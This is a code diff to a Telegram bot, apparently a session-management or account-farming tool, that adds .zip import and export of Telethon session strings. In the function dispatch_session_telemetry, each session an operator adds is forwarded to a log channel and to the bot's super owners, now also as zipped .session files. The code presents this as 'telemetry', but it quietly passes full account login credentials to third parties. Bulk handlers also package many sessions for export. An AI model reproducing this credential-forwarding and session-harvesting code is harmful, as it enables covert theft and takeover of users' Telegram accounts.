@@ -6,6 +6,8 @@ import re
 import random
 import time
 import math
+import io
+import zipfile
 from typing import Dict, Any, List, Optional, Tuple
 
 # aiogram 3.x imports
@@ -1169,30 +1171,45 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
 @router.callback_query(F.data == "add_account_session")
 async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session file log:</b>\n<i>(Supports unlimited bulk multi-line file imports!)</i>", parse_mode="HTML")
+    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session / .zip file log:</b>\n<i>(Supports unlimited bulk multi-line file imports and .zip archives containing .session, .txt files!)</i>", parse_mode="HTML")
     await state.set_state(RegistrationStates.waiting_for_session_file)
 
 @router.message(StateFilter(RegistrationStates.waiting_for_session_file))
 async def process_session_file(message: Message, state: FSMContext, bot: Bot):
     user_id = message.from_user.id
-    raw_content = ""
+    potential_sessions = []
     
     if message.document:
         file_info = await bot.get_file(message.document.file_id)
         file_bytes = await bot.download_file(file_info.file_path)
-        raw_content = file_bytes.read().decode('utf-8', errors='ignore').strip()
+        
+        if message.document.file_name and message.document.file_name.lower().endswith('.zip'):
+            try:
+                zip_data = file_bytes.read()
+                with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
+                    for name in zf.namelist():
+                        if name.startswith('__MACOSX') or name.endswith('/'):
+                            continue
+                        if name.lower().endswith('.session') or name.lower().endswith('.txt'):
+                            try:
+                                content = zf.read(name).decode('utf-8', errors='ignore').strip()
+                                extracted = [s.strip() for s in re.split(r'[\r\n,;]+', content) if len(s.strip()) > 30]
+                                potential_sessions.extend(extracted)
+                            except Exception as zip_e:
+                                logger.error(f"Failed extracting {name} from zip: {zip_e}")
+            except Exception as zip_err:
+                await message.answer(f"❌ <b>Zip Extraction Error:</b> Could not process the ZIP file: <code>{str(zip_err)}</code>")
+                await state.clear()
+                return
+        else:
+            raw_content = file_bytes.read().decode('utf-8', errors='ignore').strip()
+            potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
     elif message.text:
         raw_content = message.text.strip()
+        potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
 
-    if not raw_content:
-        await message.answer("❌ <b>Source Error:</b> Empty input detected. Verification canceled.")
-        await state.clear()
-        return
-
-    potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
-    
     if not potential_sessions:
-        await message.answer("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your text.")
+        await message.answer("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your file or input text.")
         await state.clear()
         return
 
@@ -1239,18 +1256,29 @@ async def process_session_file(message: Message, state: FSMContext, bot: Bot):
 async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
     file_bytes = session_str.encode('utf-8')
     document = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
+    
+    # Also generate .zip file containing session as .session
+    zip_buffer = io.BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr(f"session_{phone}.session", session_str)
+    zip_bytes = zip_buffer.getvalue()
+    zip_document = BufferedInputFile(zip_bytes, filename=f"session_{phone}.zip")
+    
     caption = f"🔑 <b>Session Event Telemetry Dump</b>\nPhone: <code>+{phone}</code>\nUsername: <b>@{username or 'None'}</b>\nOperator Creator ID: <code>{adder_id}</code>"
     
     if config.LOG_CHANNEL_ID:
         try:
             await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=document, caption=caption, parse_mode="HTML")
+            await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=zip_document, caption=f"📦 <b>Session ZIP Telemetry Dump (.session inside)</b>\nPhone: <code>+{phone}</code>", parse_mode="HTML")
         except Exception as e:
             logger.error(f"Failed sending updates to log channel: {e}")
             
     for owner_id in config.SUPER_OWNER_IDS:
         try:
             owner_doc = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
+            owner_zip_doc = BufferedInputFile(zip_bytes, filename=f"session_{phone}.zip")
             await bot.send_document(chat_id=owner_id, document=owner_doc, caption=caption, parse_mode="HTML")
+            await bot.send_document(chat_id=owner_id, document=owner_zip_doc, caption=f"📦 <b>Session ZIP Telemetry Dump (.session inside)</b>\nPhone: <code>+{phone}</code>", parse_mode="HTML")
         except Exception as e:
             logger.error(f"Failed sending data to owner node {owner_id}: {e}")
 
@@ -1340,9 +1368,17 @@ async def handle_export_session_run(callback: CallbackQuery, bot: Bot):
         await callback.message.answer("🛡️ <b>Access Violation:</b> Super Owner profiles are isolated and protected.")
         return
 
-    session_bytes = decrypt_data(row[1]).encode('utf-8')
+    raw_session = decrypt_data(row[1])
+    session_bytes = raw_session.encode('utf-8')
     session_file = BufferedInputFile(session_bytes, filename=f"string_{phone}.txt")
     await callback.message.reply_document(document=session_file, caption=f"✨ Session dump file generated safely for: <code>+{phone}</code>", parse_mode="HTML")
+
+    # Send ZIP containing .session file
+    zip_buf = io.BytesIO()
+    with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr(f"session_{phone}.session", raw_session)
+    zip_file = BufferedInputFile(zip_buf.getvalue(), filename=f"session_{phone}.zip")
+    await callback.message.reply_document(document=zip_file, caption=f"📦 ZIP Session archive generated for: <code>+{phone}</code>", parse_mode="HTML")
 
 @router.callback_query(F.data.startswith("export_multi_start:"))
 async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext, bot: Bot):
@@ -1445,8 +1481,16 @@ async def execute_multi_export(callback: CallbackQuery, state: FSMContext, bot: 
                     
     buffer_bytes = json.dumps(export_payload, indent=4).encode('utf-8')
     pack_file = BufferedInputFile(buffer_bytes, filename="multi_sessions_bundle.txt")
-    
     await callback.message.reply_document(document=pack_file, caption=f"✨ <b>Pack extraction compiled!</b> Successfully consolidated <code>{len(export_payload)}</code> customized database session rows.", parse_mode="HTML")
+
+    # ZIP Bundle containing individual .session files
+    zip_buffer = io.BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for item in export_payload:
+            zf.writestr(f"session_{item['phone']}.session", item['session_string'])
+    zip_file = BufferedInputFile(zip_buffer.getvalue(), filename="multi_sessions_archive.zip")
+    await callback.message.reply_document(document=zip_file, caption=f"📦 <b>ZIP Session Pack Compiled!</b> Contains <code>{len(export_payload)}</code> individual <code>.session</code> files.", parse_mode="HTML")
+
     await state.clear()
 
 @router.callback_query(F.data == "bulk_admin_export")
@@ -1482,6 +1526,14 @@ async def handle_bulk_admin_export(callback: CallbackQuery, bot: Bot):
     backup_bytes = json.dumps(export_payload, indent=4).encode('utf-8')
     backup_file = BufferedInputFile(backup_bytes, filename="bulk_admin_sessions.txt")
     await callback.message.reply_document(document=backup_file, caption=f"📦 <b>Master Datastore Core Bulk Extract Dump Complete!</b> Catalogued <code>{len(export_payload)}</code> active network session nodes safely.", parse_mode="HTML")
+
+    # ZIP Bundle containing individual .session files
+    zip_buffer = io.BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for item in export_payload:
+            zf.writestr(f"session_{item['phone']}.session", item['session_string'])
+    zip_file = BufferedInputFile(zip_buffer.getvalue(), filename="bulk_admin_sessions.zip")
+    await callback.message.reply_document(document=zip_file, caption=f"📦 <b>Master Bulk ZIP Extract Complete!</b> Catalogued <code>{len(export_payload)}</code> active <code>.session</code> files.", parse_mode="HTML")
 
 # --- DYNAMIC DB SNAPSHOT ENGINE ---
 @router.callback_query(F.data == "backup_panel")
